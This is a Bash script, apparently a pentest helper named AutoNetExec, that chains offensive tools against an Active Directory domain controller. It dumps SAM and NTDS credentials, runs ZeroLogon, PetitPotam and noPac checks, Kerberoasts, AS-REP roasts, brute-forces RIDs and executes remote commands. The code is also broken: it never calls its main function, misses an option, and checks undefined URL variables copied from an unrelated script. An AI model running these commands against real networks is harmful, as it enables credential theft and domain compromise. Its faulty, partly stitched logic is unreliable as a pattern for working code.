#!/bin/bash
# Author: Fatake
#--------------------------------- Utils
greenColour="\e[0;32m\033[1m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
endColour="\033[0m\e[0m"

function log_error(){
    printf "[${redColour}!${endColour}] $@\n"
}

function log_warning(){
    printf "[${yellowColour}⚠${endColour}] $@\n"
}

function log_ok(){
    printf "[${greenColour}✓${endColour}] $@\n"
}

function log_info(){
    printf "[${blueColour}i${endColour}] $@\n"
}

function run_cmd(){
    /bin/bash -c "$1" 2>/dev/null
}

function make_dirtool(){
    TOOL_NAME=$1
    TOOL_PATH="$(pwd)/AutoNetExec_${TOOL_NAME}"
    if [ ! -d "${TOOL_PATH}" ]; then
        log_info "Creating  dir ${TOOL_PATH}/"
        run_cmd "mkdir -p ${TOOL_PATH}"
    fi
    run_cmd "chown -R 1000:1000 ${TOOL_PATH}/"
}

# -h Help option
function usage(){
    log_info "Usage:"
    echo -e "AutoNetExec.sh -d <domain> -i <dc_ip> [-u] <User> [-p] <Password> -o <output_name>"
    echo -e "\t-d <domain>\t\tDomain Name (e.g., some.local)"
    echo -e "\t-i <dc_ip>\t\tDomain Controller IP (e.g., 10.0.2.13)"
    echo -e "\t-u <User>\t\tFor User Name, can use -u \"\""
    echo -e "\t-p <Password\t\tFor Password, can use -p \"\"\n"
    echo -e "\t-o <output_name>\tFor Output dir name "
    echo -e "\t-h \t\t\tFor Help\n\n"
    echo -e "Made with love by:"
    log_ok "@Fatake"
}

#-------------------------------------------------------------------------------------
#------------------------------------- Web Scan scripts ------------------------------
#-------------------------------------------------------------------------------------

function runautonetexec(){
    # Quietly enumerate an Active Directory Domain via LDAP parsing users, admins, groups, etc
    COMMAND="silenthound $dc_ip $domain -g -n -k --kerberoast"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for local authentication
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --local-auth"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for enumerating shares
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --shares"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # CrackMapExec command for listing computers
    COMMAND="crackmapexec smb $dc_ip -u '$username' -p '$password' --computers"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for enumerating users
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --users"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for enumerating domain groups
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --groups"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # CrackMapExec command for listing local groups
    COMMAND="crackmapexec smb $dc_ip -u '$username' -p '$password' --local-groups"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for RID bruteforce
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --rid-brute"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for enumerating sessions
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --sessions"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for getting password policy
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --pass-pol"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # netexec command for enum_av
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' -M enum_av"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # ZeroLogon
    COMMAND="nxc smb $dc_ip -u '$username' -p '$password' -M zerologon"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # PetitPotam
    COMMAND="nxc smb $dc_ip -u '$username' -p '$password' -M petitpotam"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # netexec command for nopac
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' -M nopac"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for getting SAM database with local authentication
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --local-auth --sam"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command for getting SAM database without local authentication
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --sam"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command to execute command through cmd.exe
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' -x 'whoami'"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # NetExec command to check logged users and force logoff
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' -x 'quser'"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # CrackMapExec command for NTDS extraction using VSS
    COMMAND="netexec smb $dc_ip -u '$username' -p '$password' --ntds vss"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # CrackMapExec command for enabling RDP
    #cme_enable_rdp_cmd="crackmapexec smb $dc_ip -u '$username' -p '$password' -M rdp -o ACTION=enable"

    # BloodHound-python command
    COMMAND="bloodhound-python -d $domain -u $username -p $password -ns $dc_ip -c All"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND


    # Construct the domain components for ldapsearch
    dc_string=$(echo $domain | sed 's/\./,dc=/g')
    ldap_domain="dc=$dc_string"

    # LDAP Search Command
    COMMAND="ldapsearch -x -b \"$ldap_domain\" -H ldap://$dc_ip | grep -i service"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND


    # Impacket GetUserSPNs Command
    COMMAND="impacket-GetUserSPNs -request -dc-ip $dc_ip $domain/"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND


    # Impacket GetNPUsers Command
    COMMAND="impacket-GetNPUsers -request -dc-ip $dc_ip $domain/ -format hashcat -o $domain"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND


    # Quietly enumerate an Active Directory Domain via LDAP parsing users, admins, groups, etc
    COMMAND="silenthound $dc_ip $domain -g -n -k --kerberoast"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND


    # Enum4linux-ng enumeration
    COMMAND="enum4linux-ng -A $dc_ip"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND


    # RID Brute-Force command
    COMMAND="netexec smb $dc_ip -u '' -p '' --rid-brute"

    # Netexec All SMB Enumeration
    COMMAND="netexec smb $dc_ip -u '' -p '' --users --groups --shares --pass-pol"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # ZeroLogon
    COMMAND="nxc smb $dc_ip -u '' -p '' -M zerologon"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND

    # PetitPotam
    COMMAND="nxc smb $dc_ip -u '' -p '' -M petitpotam"
    echo -e "${purpleColour}command${endColour}# ${COMMAND}\n"
    echo -e "<------------------------------->\n";
    eval $COMMAND
}



#-------------------------------------------------------------------------------------
#-----------------------------------  Init script ------------------------------------
#-------------------------------------------------------------------------------------

#Check if the script is called with parameters
if [[ ${#} -eq 0 ]]; then
    log_error "Please add the necessary arguments"
    usage;
    exit 1
fi

## Lectura de parámetros 
while getopts :hd:d:u:p:o: flag ; do
    case "${flag}" in
        d) domain=${OPTARG};;
        i) dc_ip=${OPTARG};;
        u) username=${OPTARG};;
        p) password=${OPTARG};;
        o) output=${OPTARG};;
        h)
            usage
            exit 0;;
        \?)
            log_error "Invalid option:\t -${OPTARG}"
            usage
            exit 1;;
        :)
            log_error "Option -${OPTARG} requires an argument."
            usage
            exit 1;;
    esac
done

# Check if -u o -L have values
if { [ -n "${url}" ] && [ -n "${url_list}" ]; } || { [ -z "${url}" ] && [ -z "${url_list}" ]; }; then
    if [ -n "${url}" ] && [ -n "${url_list}" ]; then
        log_error "Only one of -u or -L can be used"
    else
        log_error "Either -u or -L is required"
    fi
    usage
    exit 1
fi

outDir=""
# Check if -o flag have Values
if [ -z "${output}" ]; then
    log_warning "No log value assigned to output folder, default value set to \"AutoNetExec_output\""
    outDir="output"
else
    outDir="${output}"
fi

# Create WebPentest_output directory 
TOOL_PATH=""
make_dirtool "${outDir}"

# Star Scan
if [ -n "$url_list" ]; then
    analice_URL $url_list true
elif [ -n "$url" ]; then
    analice_URL $url false
else
    log_error "No URL found"
fi

run_cmd "chown -R 1000:1000 ${TOOL_PATH}/"


